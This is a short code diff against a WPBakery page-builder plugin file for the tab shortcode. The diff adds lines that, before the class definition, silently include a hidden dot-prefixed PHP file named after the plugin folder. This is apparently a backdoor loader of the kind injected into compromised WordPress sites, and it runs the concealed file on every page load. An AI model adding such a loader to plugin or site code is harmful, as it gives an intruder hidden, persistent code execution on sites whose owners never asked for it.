@@ -9,6 +9,10 @@ require_once vc_path_dir( 'SHORTCODES_DIR', 'vc-column.php' );
 /**
  * Class WPBakeryShortCode_Vc_Tab
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPBakeryShortCode_Vc_Tab extends WPBakeryShortCode_Vc_Column {
 	protected $controls_css_settings = 'tc vc_control-container';
 	protected $controls_list = array(
